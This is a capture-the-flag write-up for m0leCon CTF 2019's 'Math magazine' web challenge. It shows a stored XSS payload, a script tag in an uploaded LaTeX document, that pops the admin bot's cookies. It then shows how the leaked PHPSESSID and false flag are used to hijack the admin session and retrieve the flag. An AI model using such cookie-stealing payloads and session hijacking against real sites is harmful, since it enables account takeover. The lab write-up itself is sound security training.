<h1>m0leCon CTF 2019 â€“ Math magazine</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 55</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Do you like math? Click here.</p>
  
  <p>Author: @andreossido</p>
  
  <p>http://10.255.0.1:8011/</p>
</blockquote>

<h2>Solution</h2>

<p>Connecting to the website you can see the following message.</p>

<p>```
Welcome!</p>

<p>This site is a math articles container.
At the moment you can only read your articles and write new ones.
Only admin can read other account articles, so pay attention what do you write :)
```</p>

<p>This website allows you to upload LaTeX documents and to list and view your uploaded ones. The view functionality doesn't escape/encode the output and the text field where you can write your LaTeX script doesn't sanitize the input; as a consequence, the website is vulnerable to XSS.</p>

<p>```latex
\documentclass{article}
\begin{document}</p>

<script>alert();</script>

<p>\end{document}
```</p>

<p>You can abuse this, in order to print administrator cookies, with the following payload.</p>

<p>```latex
\documentclass{article}
\begin{document}</p>

<script>alert(document.cookie);</script>

<p>\end{document}
```</p>

<p>When the article is submitted, the following output is shown.</p>

<p>```
WARN: Published, but admin cannot view you article :(
Error:
[<em>] Going to visit url: http://10.255.0.1:8011/?p=articles&amp;a=view&amp;u_id=f2c41083389d45ee757cc8f65eb2afd4&amp;id=11
[</em>] Getting FLAG...</p>

<p>Alert Text: None
Message: unexpected alert open: {Alert text : PHPSESSID=aec0e26f10db41a5b584483bdc67dab1; FLAG=ptm{the<em>flag</em>is<em>not</em>here}}
(Session info: headless chrome=75.0.3770.100)
```</p>

<p>But the flag is not the real one.</p>

<p>Analyzing the HTML, you can discover the following interesting comment.</p>

<p><code>html
&lt;!--
    &lt;li class="nav-item"&gt;
        (Not used anymore, but I left it here for historical reasons)
        &lt;a class="nav-link" href="./src.zip"&gt;Source&lt;/a&gt;
    &lt;/li&gt;
--&gt;
</code></p>

<p>So you can download the <a href="src.zip">src.zip</a> file.</p>

<p>Analyzing the <a href="./src/pages/articles.actions/list">list</a> source code, you can discover an interesting <code>if</code> statement, where the real flag is set into a cookie.</p>

<p>```php
<?php
    if(isset($<em>COOKIE['FLAG']) &amp;&amp; $</em>COOKIE['FLAG'] === FALSE<em>FLAG &amp;&amp; $</em>SESSION['SECRET'] === SECRET){
        setCookie('FLAG', FLAG, time() + 100, '/');
    }</p>

<pre><code>$f = new ArticleFactory(USER);
</code></pre>

<p>?>
```</p>

<p>At this point you have already leaked the <code>FALSE_FLAG</code>, so you can force it into a cookie. You don't have <code>SECRET</code> value into your session, but you have the <code>PHPSESSID</code> of the administrator, so you can steal its session changing your cookie.</p>

<p>Crafting both cookies accordingly and accessing to the <code>list</code> functionality will give you the flag into the <code>FLAG</code> cookie.</p>

<p><code>
ptm{L4t3x_1nj3ct10n_1s_c00l}
</code></p>

<p><strong>Note</strong>: According to the challenge creator, the technique to leak <code>PHPSESSID</code> and false <code>FLAG</code> was not the <em>intended</em> one.</p>
